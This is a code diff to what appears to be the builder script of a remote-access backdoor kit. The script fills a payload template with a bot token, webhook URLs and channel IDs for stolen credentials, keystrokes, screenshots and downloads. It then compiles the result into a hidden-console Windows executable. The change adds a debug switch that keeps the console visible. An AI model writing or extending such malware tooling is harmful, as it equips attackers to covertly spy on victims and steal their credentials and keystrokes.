@@ -8,7 +8,7 @@ from prettytable import PrettyTable
 
 class Builder:
     
-    def __init__(self,BACKDOOR_NAME,BOT_TOKEN,TOKEN_WEBHOOK,KEYLOGGER_WEBHOOK,SCREENSHOTS_ID,DOWNLOADS_ID,AGENT_ONLINE_ID,CREDENTIALS_ID,KEYLOG ):
+    def __init__(self,BACKDOOR_NAME,BOT_TOKEN,TOKEN_WEBHOOK,KEYLOGGER_WEBHOOK,SCREENSHOTS_ID,DOWNLOADS_ID,AGENT_ONLINE_ID,CREDENTIALS_ID,KEYLOG,DEBUG):
         self.BACKDOOR_NAME = BACKDOOR_NAME
         self.KEYLOG = KEYLOG
         self.KEYLOGGER_WEBHOOK = KEYLOGGER_WEBHOOK
@@ -18,6 +18,7 @@ class Builder:
         self.DOWNLOADS_ID = DOWNLOADS_ID
         self.AGENT_ONLINE_ID = AGENT_ONLINE_ID
         self.CREDENTIALS_ID = CREDENTIALS_ID
+        self.DEBUG = DEBUG
         self.path_to_pyinstaller = os.path.expanduser('~/.wine/drive_c/users/root/Local Settings/Application Data/Programs/Python/Python38-32/Scripts/pyinstaller.exe')
 
 
@@ -27,7 +28,7 @@ class Builder:
         file = f.read()
         f.close()
 
-        newfile = file.replace("{KEYLOG}", str(self.KEYLOG))
+        newfile = file.replace("{KEYLOG}", str(self.KEYLOG).capitalize())
         newfile = newfile.replace("{BOT_TOKEN}", str(self.BOT_TOKEN))
         newfile = newfile.replace("{TOKEN_WEBHOOK}", str(self.TOKEN_WEBHOOK))
         newfile = newfile.replace("{KEYLOGGER_WEBHOOK}", str(self.KEYLOGGER_WEBHOOK))
@@ -44,6 +45,8 @@ class Builder:
 
     def compile(self):
         compile_command = ["wine", self.path_to_pyinstaller, "--onefile", "--noconsole", "--icon=img/exe_file.ico", self.BACKDOOR_NAME+".py"]
+        if self.DEBUG == True:
+            compile_command.pop(3)
         if os.name == 'nt':
             compile_command[1] = 'venv/Scripts/pyinstaller.exe'
             compile_command.remove("wine")
@@ -175,7 +178,11 @@ else:
                     if answer == "y":
                         print("\n[+] Building the Backdoor")
                         print("[+] Please wait...\n")
-                        builder = Builder(BACKDOOR_NAME=list[0],BOT_TOKEN=list[1],TOKEN_WEBHOOK=list[2],KEYLOGGER_WEBHOOK=list[3],SCREENSHOTS_ID=list[4],DOWNLOADS_ID=list[5],AGENT_ONLINE_ID=list[6],CREDENTIALS_ID=list[7],KEYLOG=list[8])
+                        if "-d" in command_list:
+                            debug = True 
+                        else:
+                            debug = False
+                        builder = Builder(BACKDOOR_NAME=list[0],BOT_TOKEN=list[1],TOKEN_WEBHOOK=list[2],KEYLOGGER_WEBHOOK=list[3],SCREENSHOTS_ID=list[4],DOWNLOADS_ID=list[5],AGENT_ONLINE_ID=list[6],CREDENTIALS_ID=list[7],KEYLOG=list[8],DEBUG=debug)
                         builder.build()
                         cont = False
                         print('\n[+] The Backdoor can be found inside the "dist" directory')
